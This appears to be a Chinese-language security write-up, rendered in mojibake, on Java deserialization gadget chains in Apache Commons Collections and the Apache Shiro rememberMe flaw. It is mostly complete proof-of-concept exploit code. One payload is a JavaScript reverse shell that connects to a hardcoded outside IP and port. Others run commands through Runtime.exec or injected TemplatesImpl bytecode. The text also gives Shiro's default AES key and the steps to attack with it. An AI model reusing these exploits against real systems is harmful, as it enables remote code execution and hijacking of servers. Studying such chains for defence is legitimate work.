jsæ˜¯å¼±ç±»å‹çš„è¯­è¨€,æ‰€æœ‰å˜é‡ä½¿ç”¨varå³å¯,ä¸”ä¸éœ€è¦å£°æ˜ç±»å‹ä¹Ÿä¸æ”¯æŒç±»å‹è½¬æ¢. ä¾‹å¦‚ String a å’Œ int béœ€è¦å†™ä¸ºvar a å’Œ var b. 2.å¼‚å¸¸æ•æ‰ å¼‚å¸¸ä¸ç”¨å£°æ˜ç±»å‹ ä¾‹å¦‚ try{ var a; }catch (e){ } POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.script.ScriptEngineManager; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CommonsCollections12 { // private static String jscmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; // DNSæµ‹è¯• // private static String u = \"http://95s6my.dnslog.cn\"; // private static String jscmd = String.format(\"new java.util.HashMap().put(new java.net.URL(\\\"%s\\\"), \\\"2\\\");\", u); // å»¶æ—¶æµ‹è¯• // private static String time = \"3000\"; // private static String jscmd = String.format(\"java.lang.Thread.sleep(%s);\", time);; // java.net.Socket åå¼¹shell private static String host = \"81.70.101.91\"; private static int port = 8888; private static String jscmd = String.format(\"var host = \\\"%s\\\";\\n\" + \"var port = %d;\\n\" + \"var p;\\n\" + \"var os = java.lang.System.getProperty(\\\"os.name\\\").toLowerCase(java.util.Locale.ENGLISH);\\n\" + \"if(os.contains(\\\"win\\\")){\\n\" + \" p = new java.lang.ProcessBuilder(\\\"cmd\\\").redirectErrorStream(true).start();\\n\" + \" }else{\\n\" + \" p = new java.lang.ProcessBuilder(\\\"sh\\\").redirectErrorStream(true).start();\\n\" + \" }\\n\" + \"var s = new java.net.Socket(host,port);\\n\" + \"var pi = p.getInputStream(),pe = p.getErrorStream(),si = s.getInputStream();\\n\" + \"var po = p.getOutputStream(),so = s.getOutputStream();\\n\" + \"while(!s.isClosed()) {\\n\" + \"while(pi.available()>0) {\\n\" + \"so.write(pi.read());\\n\" + \"}\\n\" + \"while(pe.available()>0) {\\n\" + \"so.write(pe.read());\\n\" + \"}\\n\" + \"while(si.available()>0) {\\n\" + \"po.write(si.read());\\n\" + \"}\\n\" + \"so.flush();\\n\" + \"po.flush();\\n\" + \"java.lang.Thread.sleep(50);\\n\" + \"try {\\n\" + \"p.exitValue();\\n\" + \"break;\\n\" + \"}\\n\" + \"catch (e){\\n\" + \"}\\n\" + \"};\\n\" + \"p.destroy();\\n\" + \"s.close();\", host, port); public static void main(String[] args) throws Exception{ String[] execArgs = new String[]{jscmd}; Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer(\"newInstance\", new Class[0], new Object[0]), new InvokerTransformer(\"getEngineByName\", new Class[]{String.class}, new Object[]{\"JavaScript\"}), new InvokerTransformer(\"eval\", new Class[]{String.class}, execArgs), new ConstantTransformer(1)}; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // è°ƒç”¨decorateä¸»è¦æ˜¯ç›´æ¥å†™å…¥çš„æ–¹æ³•æ˜¯protected, éœ€è¦è®¾ç½®æƒé™æ‰è¡Œ, è€Œè¯¥æ–¹æ³•æ˜¯public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"ricky\"); /*jdk1.8*/ HashSet hashSet = new HashSet(1); hashSet.add(tiedMapEntry); outerMap.remove(\"ricky\"); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(hashSet); objectoutputstream.close(); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } } CC13 å‚è€ƒ: https://forum.butian.net/share/1233 CommonCollections DualTreeBidiMap åˆ©ç”¨é“¾çš„è§¦å‘ç‚¹æ˜¯åœ¨ org.apache.commons.collections.bidimap.DualHashBidiMap ç±»çš„readObjectæ–¹æ³•, åœ¨readObjectæ–¹æ³•ä¸­è°ƒç”¨äº†putAllæ–¹æ³•ï¼Œä¼ å…¥çš„mapå‚æ•°æ˜¯é€šè¿‡ååºåˆ—åŒ–å¾—åˆ°çš„ public void putAll(Map map) { for (Iterator it = map.entrySet().iterator(); it.hasNext();) { Map.Entry entry = (Map.Entry) it.next(); put(entry.getKey(), entry.getValue()); } } é€šè¿‡putå¯¹è±¡ä¸­çš„ containsKey public Object put(Object key, Object value) { if (maps[0].containsKey(key)) { maps[1].remove(maps[0].get(key)); } if (maps[1].containsKey(value)) { maps[0].remove(maps[1].get(value)); } final Object obj = maps[0].put(key, value); maps[1].put(value, key); return obj; } æ§åˆ¶map[0]ä¸ºTiedMapEntryå¯¹è±¡, åœ¨containsKeyæ–¹æ³•ä¸­ä¼šè°ƒç”¨hash(key) æ–¹æ³•è®¡ç®—ä¼ å…¥çš„keyçš„hash, è€Œåœ¨hashæ–¹æ³•ä¸­ä¼šè°ƒç”¨key.hashCode()æ–¹æ³•è§¦å‘ public boolean containsKey(Object key) { return getNode(hash(key), key) != null; } POC package CommonsCollections; import org.apache.commons.collections.BidiMap; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC13_DualHashBidiMap { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}), new ConstantTransformer(1) }; Transformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"1\"); Map expMap = new HashMap(); expMap.put(\"2\", tiedMapEntry); // æ§åˆ¶map[0]ä¸ºTiedMapEntryå¯¹è±¡ Class clazz = Class.forName(\"org.apache.commons.collections.bidimap.DualHashBidiMap\"); Constructor constructor = clazz.getDeclaredConstructor(Map.class, Map.class, BidiMap.class); constructor.setAccessible(true); Object dualHashBidiMap = constructor.newInstance(expMap, null, null); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(dualHashBidiMap); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); } } CommonCollections4 DualTreeBidiMap è§¦å‘ç‚¹æ˜¯åœ¨org.apache.commons.collections4.bidimap.DualTreeBidiMapç±»çš„readObjectæ–¹æ³•ï¼ŒåŒæ ·æ˜¯è°ƒç”¨äº†putAllæ–¹æ³•ï¼Œå¹¶ä¸”DualTreeBidiMapç±»åŒæ ·æ˜¯ç»§æ‰¿è‡ªAbstractDualBidiMapæŠ½è±¡ç±» public void putAll(final Map map) { for (final Map.Entry entry : map.entrySet()) { put(entry.getKey(), entry.getValue()); } } ç›´æ¥æ¥çœ‹putæ–¹æ³•çš„å®šä¹‰ï¼Œè¿™é‡Œçš„åˆ©ç”¨ç‚¹ä¸å†æ˜¯containsKeyæ–¹æ³•ï¼Œå› ä¸ºåœ¨readObjectæ–¹æ³•ä¸­this.normalMapå’Œthis.reverseMapæ˜¯è¢«èµ‹å€¼ä¸ºç©ºçš„TreeMapå¯¹è±¡ï¼Œæ‰€ä»¥æ— æ³•å†åˆ©ç”¨ï¼Œä¸è¿‡åœ¨ä¸‹é¢è°ƒç”¨äº†this.normalMapå’Œthis.reverseMapå¯¹è±¡çš„putæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯TreeMapçš„putæ–¹æ³• public V put(final K key, final V value) { if (normalMap.containsKey(key)) { reverseMap.remove(normalMap.get(key)); } if (reverseMap.containsKey(value)) { normalMap.remove(reverseMap.get(value)); } final V obj = normalMap.put(key, value); reverseMap.put(value, key); return obj; } åœ¨TreeMapçš„putæ–¹æ³•ä¸­ä¼šè°ƒç”¨compareæ–¹æ³•, è€Œåœ¨compareæ–¹æ³•ä¸­åˆä¼šè°ƒç”¨æˆå‘˜å˜é‡comparatorçš„compareæ–¹æ³•å¦‚æœèƒ½æ§åˆ¶è¿™é‡Œçš„comparatorä¸ºTransformingComparatorå¯¹è±¡ï¼Œå°±å¯ä»¥å®ŒæˆååŠéƒ¨åˆ†åˆ©ç”¨é“¾çš„æ„é€ ï¼Œå› ä¸ºç”¨åˆ°äº†TransformingComparatorç±»ï¼Œè€ŒTransformingComparatorç±»åœ¨Commons Collections 4.0ç‰ˆæœ¬ä¸‹å®ç°äº†Serializableæ¥å£ï¼Œæ‰€ä»¥è¯¥åˆ©ç”¨é“¾åœ¨CommonsCollections 4.0ç‰ˆæœ¬ä¸‹æ‰å¯åˆ©ç”¨, DualTreeBidiMapå¯¹è±¡çš„æˆå‘˜å˜é‡comparatoråœ¨æ„é€ æ–¹æ³•ä¸­æ˜¯é€šè¿‡ä¼ å…¥çš„keyComparatorå‚æ•°è¿›è¡Œèµ‹å€¼ï¼Œæ‰€ä»¥æ˜¯å¯æ§çš„ POC package CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bidimap.DualTreeBidiMap; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; public class CC14_DualTreeBidiMap { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}), new ConstantTransformer(1) }; Transformer chainedTransformer = new ChainedTransformer(new ConstantTransformer(1)); TransformingComparator comparator = new TransformingComparator(chainedTransformer); DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap(comparator, comparator); dualTreeBidiMap.put(\"demo\", \"demo\"); Field field = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); field.setAccessible(true); field.set(chainedTransformer, transformers); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(dualTreeBidiMap); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); } } CommonCollections4 DualLinkedHashBidiMap åŒç†CommonCollections DualTreeBidiMap, POC package CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bidimap.DualLinkedHashBidiMap; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import org.apache.commons.collections4.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC13_DualLinkedHashBidiMap { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}), new ConstantTransformer(1) }; Transformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); LazyMap lazyMap = LazyMap.lazyMap(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"1\"); Map expMap = new HashMap(); expMap.put(\"2\", tiedMapEntry); DualLinkedHashBidiMap dualLinkedHashBidiMap = new DualLinkedHashBidiMap(); Field field1 = dualLinkedHashBidiMap.getClass().getSuperclass().getDeclaredField(\"normalMap\"); field1.setAccessible(true); field1.set(dualLinkedHashBidiMap, expMap); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(dualLinkedHashBidiMap); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); } } CC14_Flat3Map tabbyæŒ–æ˜ match path=(m1:Method)-[:CALL*..1]->(sink:Method) where m1.NAME=~\"put\" and m1.IS_SERIALIZABLE=true and sink.NAME=\"equals\" return path ä»£æ›¿ hashtable èµ·åˆ°å†²çªä½œç”¨, 3å’Œ4ç‰ˆæœ¬çš†å¯(å†™æ³•ç¨å¾®æœ‰äº›ä¸åŒ) Flat3Map#readObject Flat3Map#put (2ç»„æ•°æ®keyçš„hashCodeç›¸ç­‰åè¿›å…¥equalsåˆ¤æ–­) Flat3Map#equals(key1) (å‰ä¸€ç»„keyä¸ºæ¶æ„çš„Map, åä¸€ç»„ä¸ºHashMap) AbstractMap#get(key) è§¦å‘æ¶æ„Mapçš„getæ–¹æ³•, åç»­åŒCC7 POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.DefaultedMap; import org.apache.commons.collections.map.Flat3Map; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; import static util.Reflections.setFieldValue; public class CC14_Flat3Map { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap1 = new HashMap(); // Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer); // /**å†²çªæ˜¯æµ‹è¯•åå†™å¥½çš„,ä¸èƒ½ä¹±æ”¹*/ // lazyMap1.put(\"yy\", 1); Map defaultMap1 = DefaultedMap.decorate(innerMap1, chainedTransformer); /**å†²çªæ˜¯æµ‹è¯•åå†™å¥½çš„,ä¸èƒ½ä¹±æ”¹*/ defaultMap1.put(\"yy\", 1); /*jdk1.7~jdk1.8*/ Map outerMap = new HashMap(); outerMap.put(\"zZ\", 1); Flat3Map flat3Map = new Flat3Map(); // flat3Map.put(lazyMap1, \"rce\"); flat3Map.put(defaultMap1, \"rce\"); setFieldValue(flat3Map, \"hash1\", 0); flat3Map.put(outerMap, \"ricky\"); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(flat3Map); objectoutputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); }catch(Exception e){ e.printStackTrace(); } } } CC15_CC4 with 3.2.1 æºäºä¸€æ¬¡æ¯”èµ›, æŠŠä¸€äº›CommonCollections 3.2.1ä¸‹å¸¸ç”¨çš„ Transformer ç»™ ban äº† ConstantTransformer InvokeTransformer ä»CC4ä¸‹æ‰‹äº†, è™½ç„¶æ˜¯ç”¨äºCommonsCollections 4.0 ä½†æ˜¯å¯ä»¥æ”¹é€ ä¸€ä¸‹, ConstantTransformer#transformæ–¹æ³•æ˜¯ç›´æ¥è¿”å›ä¼ å…¥çš„å¯¹è±¡ public Object transform(Object input) { return iConstant; } è¢« ban ä»¥åå°è¯• TransformMap public Object transform(Object input) { return this.iMap.get(input); } å…¶å®ä¹Ÿå¾ˆæ˜æ˜¾å°±æ˜¯é€šè¿‡keyå€¼å»å–value, æµ‹è¯•äº† hashMap#get æ–¹æ³•å°±å¯ä»¥å®ç°, æ‰€ä»¥å¯ä»¥é€šè¿‡å»ºç«‹ hashMap æŠŠvalueèµ‹å€¼ä¸ºæˆ‘ä»¬éœ€è¦çš„ TrAXFilter.class, åé¢å°±æ˜¯é€šè¿‡ä¸€ç§æ–¹å¼å»è§¦å‘ LazyMap.get æˆ– DefaultedMap.get å³å¯, è¿™é‡Œæˆ‘æ‰ç”¨äº†CC5(å›¾æ–¹ä¾¿å·æ‡’), InvokeTransformeråˆ™æ˜¯å¯ä»¥æ›¿æ¢æˆ InstantiateTransformer, å› ä¸ºæ–°å»º TrAXFilter å¯¹è±¡è§¦å‘äº†è¿™å¥ _transformer = (TransformerImpl) templates.newTransformer(); ç„¶åå°±æ˜¯ TransformerImpl çš„æ¶æ„æ¨¡æ¿æ³¨å…¥, è¿™æ ·ä¹Ÿå°±æ˜¯å°†CC4å˜æˆäº†å…¨ç‰ˆæœ¬é€šç”¨åŒæ—¶æ‘†è„±äº†3.2.1ä¸¤ä¸ªå¸¸ç”¨çš„ Transformer POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.MapTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC15_InstantiateTransformer { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { // ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ä¾‹åŒ–ä¸€ä¸ªClassPoolå®¹å™¨ã€‚ ClassPool classPool = ClassPool.getDefault(); // å‘å®¹å™¨ä¸­çš„ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®æ’å…¥AbstractTranslet.classï¼Œä¸ªäººè®¤ä¸ºæ˜¯æ–¹ä¾¿è®©åé¢èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªç±» classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // ä½¿ç”¨å®¹å™¨æ–°å»ºä¸€ä¸ªCtClassï¼Œç›¸å½“äºæ–°å»ºä¸€ä¸ªclassï¼Œç±»åä¸ºEvil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // ç»™è¿™ä¸ªç±»åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥åˆ°ç±»ä¸­ ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // é‡æ–°è®¾ç½®ç±»åä¸ºä¸€ä¸ªéšæœºçš„åå­— ctClass.setName(className); // ç»™è¿™ä¸ªç±»æ·»åŠ ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ç»§æ‰¿è¯¥çˆ¶ç±»ã€‚ ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™ // å°†è¿™ä¸ªç±»è¾“å‡ºåˆ°é¡¹ç›®ç›®å½•ä¸‹ // ctClass.writeFile(\"./\"); // å°†è¿™ä¸ªclassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] classBytes = ctClass.toBytecode(); // å°†å­—èŠ‚æ•°ç»„æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  byte[][] targetByteCodes = new byte[][]{classBytes}; // å®ä¾‹åŒ–TemplatesImplå¯¹è±¡ TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); Map hashMap = new HashMap(); hashMap.put(\"ricky\", TrAXFilter.class); Transformer[] fakeTransformers = new Transformer[] {/*new ConstantTransformer(1)*/}; Transformer mapTransformer = MapTransformer.getInstance(hashMap); Transformer[] transformers = new Transformer[]{ mapTransformer, new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // è°ƒç”¨decorateä¸»è¦æ˜¯ç›´æ¥å†™å…¥çš„æ–¹æ³•æ˜¯protected, éœ€è¦è®¾ç½®æƒé™æ‰è¡Œ, è€Œè¯¥æ–¹æ³•æ˜¯public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); /** * BadAttributeValueException.readObject -> * TiedMapEntry.toString -> * TiedMapEntry.getValue -> * (this.map.get)LazyMap.get -> * ChainedTransformer.transform * */ TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"ricky\"); /*jdk1.8*/ BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); // setFieldValue(badAttributeValueExpException, \"val\", tiedMapEntry); //è°ƒç”¨CC2å†™å¥½çš„è®¾ç½®å‡½æ•° // å•ç‹¬è®¾ç½® Field field = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); field.setAccessible(true); field.set(badAttributeValueExpException, tiedMapEntry); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ setFieldValue(chainedTransformer, \"iTransformers\", transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(badAttributeValueExpException); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); ois.close(); } } CommonsCollectionsShiro å½±å“ç‰ˆæœ¬ï¼šApache Shiro ç‰¹å¾åˆ¤æ–­ï¼šè¿”å›åŒ…ä¸­åŒ…å«rememberMe=deleteMeå­—æ®µ shiroé»˜è®¤ä½¿ç”¨äº†CookieRememberMeManagerï¼Œå…¶å¤„ç†cookieçš„æµç¨‹æ˜¯ï¼šå¾—åˆ°rememberMeçš„cookieå€¼>>>Base64è§£ç >>>AESè§£å¯†>>>ååºåˆ—åŒ–ã€‚ç„¶è€ŒAESçš„å¯†é’¥æ˜¯ç¡¬ç¼–ç çš„ï¼Œå°±å¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„æ•°æ®é€ æˆååºåˆ—åŒ–çš„RCEæ¼æ´ã€‚ å‚è€ƒ: https://y4er.com/post/shiro-rememberme-rce/ AESåŠ å¯†çš„æµç¨‹ä¸»è¦åœ¨ org.apache.shiro.mgt.AbstractRememberMeManageä¸­ public abstract class AbstractRememberMeManager implements RememberMeManager { private static final Logger log = LoggerFactory.getLogger(AbstractRememberMeManager.class); // å¯†é’¥ private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); // AESåŠ å¯†, æ¨¡å¼ä¸ºCBC private Serializer serializer = new DefaultSerializer(); private CipherService cipherService = new AesCipherService(); private byte[] encryptionCipherKey; private byte[] decryptionCipherKey; ... // åŠ å¯†æµç¨‹ protected byte[] encrypt(byte[] serialized) { byte[] value = serialized; CipherService cipherService = this.getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCipherKey()); value = byteSource.getBytes(); } return value; } // è§£å¯†æµç¨‹ protected byte[] decrypt(byte[] encrypted) { byte[] serialized = encrypted; CipherService cipherService = this.getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.decrypt(encrypted, this.getDecryptionCipherKey()); serialized = byteSource.getBytes(); } return serialized; } ... // æœ€åè°ƒç”¨ååºåˆ—åŒ– protected PrincipalCollection deserialize(byte[] serializedIdentity) { return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity); } ååºåˆ—åŒ–æ–¹æ³•åœ¨org.apache.shiro.io.DefaultSerializerä¸­ public T deserialize(byte[] serialized) throws SerializationException { if (serialized == null) { String msg = \"argument cannot be null.\"; throw new IllegalArgumentException(msg); } else { ByteArrayInputStream bais = new ByteArrayInputStream(serialized); BufferedInputStream bis = new BufferedInputStream(bais); try { ObjectInputStream ois = new ClassResolvingObjectInputStream(bis); // ååºåˆ—åŒ– T deserialized = ois.readObject(); ois.close(); return deserialized; } catch (Exception var6) { String msg = \"Unable to deserialze argument byte array.\"; throw new SerializationException(msg, var6); } } } æ”»å‡»è¿‡ç¨‹å¦‚ä¸‹ï¼š ä½¿ç”¨CommonsCollections6_DefaultedMapåˆ©ç”¨é“¾ç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–Payload ä½¿ç”¨Shiroé»˜è®¤Keyè¿›è¡ŒåŠ å¯† å°†å¯†æ–‡ä½œä¸ºrememberMeçš„Cookieå‘é€ç»™æœåŠ¡ç«¯ ç›´æ¥å°†å…¶åŠ å¯†åç”Ÿæˆçš„base64å­—ç¬¦ä¸²æ”¾ç½®RememberMe, ä¼šå‡ºç°å¦‚ä¸‹æŠ¥é”™ å‚è€ƒ: https://blog.zsxsoft.com/post/35 https://www.anquanke.com/post/id/192619 ä¸»è¦åŸå› ä¸º: å¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«éJavaè‡ªèº«çš„æ•°ç»„ï¼Œåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯ã€‚è¿™å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆCommonsCollections6æ— æ³•åˆ©ç”¨äº†ï¼Œå› ä¸ºå…¶ä¸­ç”¨åˆ°äº†Transformeræ•°ç»„ã€‚ æ„å»ºæ— æ•°ç»„ gadget é€šè¿‡TiedMapEntryä½œä¸ºä¸­ç»§, è°ƒç”¨LazyMap/DefaultedMapçš„getæ–¹æ³•, 